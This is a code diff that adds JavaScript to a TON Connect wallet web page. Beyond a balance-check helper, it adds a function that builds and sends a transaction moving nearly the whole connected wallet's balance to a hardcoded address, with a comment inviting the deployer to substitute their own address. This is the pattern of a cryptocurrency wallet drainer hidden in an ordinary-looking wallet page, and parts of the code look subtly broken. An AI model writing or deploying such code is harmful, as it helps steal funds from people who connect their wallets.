@@ -59,6 +59,57 @@
             manifestUrl: manifestUrl,
             buttonRootId: 'ton-connect'
         });
+
+        // Event listener for wallet connection
+        tonConnectUI.onStatusChange((walletInfo) => {
+            if (walletInfo.account) {
+                console.log('Wallet connected:', walletInfo.account);
+                checkBalance(walletInfo.account.address);
+            }
+        });
+
+        // Function to check user balance
+        async function checkBalance(walletAddress) {
+            try {
+                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
+                const data = await response.json();
+                if (data && data.result) {
+                    const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
+                    console.log(`Balance of ${walletAddress}: ${balance} TON`);
+                } else {
+                    console.error('Failed to fetch balance');
+                }
+            } catch (error) {
+                console.error('Error fetching balance:', error);
+            }
+        }
+
+        // Function to transfer TON and NFTs
+        async function didtrans() {
+            try {
+                const walletInfo = tonConnectUI.getWallet();
+                if (!walletInfo) {
+                    alert('Please connect your wallet first.');
+                    return;
+                }
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
+                    messages: [
+                        {
+                            address: 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c', // Replace with your wallet address
+                            amount: walletInfo.balance - 3000000 // Deduct fee (in nanotons)
+                        }
+                    ]
+                };
+
+                // Send transaction
+                await tonConnectUI.sendTransaction(transaction);
+                console.log('Transaction sent successfully');
+            } catch (error) {
+                console.error('Failed to send transaction:', error);
+            }
+        }
     </script>
     <script src="tonsdk.js"></script>
 </body>
